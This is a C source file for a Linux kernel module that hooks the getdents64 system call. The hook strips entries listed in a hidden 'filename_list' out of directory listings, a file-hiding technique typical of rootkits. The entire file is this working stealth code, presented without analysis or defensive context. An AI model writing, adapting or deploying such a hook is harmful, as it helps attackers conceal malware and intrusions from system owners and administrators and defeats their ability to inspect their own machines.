//
// Created by black on 22-10-16.
//

#include "file.h"
#include "data.h"
#include "hook.h"

#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/slab.h>


long HookGetdents64(struct pt_regs *regs, long (*orig_func)(const struct pt_regs *)) {
    int fd = (int) regs->di;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *) regs->si;
    unsigned long inode;
    char *name = NULL;
    unsigned long error;
    struct linux_dirent64 *currentDir, *direntKer, *previousDir = NULL;
    unsigned long offset = 0;

    jump_func = (volatile unsigned long) CleanFunc;
    long ret = orig_func(regs);
    direntKer = kzalloc(ret, GFP_KERNEL);
    if (ret <= 0 || direntKer == NULL)
        return ret;

    error = copy_from_user(direntKer, dirent, ret);
    if (error)
        goto done;

    struct List temp;
    while (offset < ret) {
        currentDir = (void *) direntKer + offset;

        name = currentDir->d_name;
        inode = currentDir->d_ino;
        temp.data = name, temp.inode_or_port = inode;
        if (ListContainsDataAndInode(temp, &filename_list)) {
            if (currentDir == direntKer) {
                ret -= currentDir->d_reclen;
                memmove(currentDir, (void *) currentDir + currentDir->d_reclen, ret);
                continue;
            }
            previousDir->d_reclen += currentDir->d_reclen;
        } else {
            previousDir = currentDir;
        }
        offset += currentDir->d_reclen;
    }

    error = copy_to_user(dirent, direntKer, ret);
    if (error)
        goto done;


    done:
    kfree(direntKer);
    return ret;
}
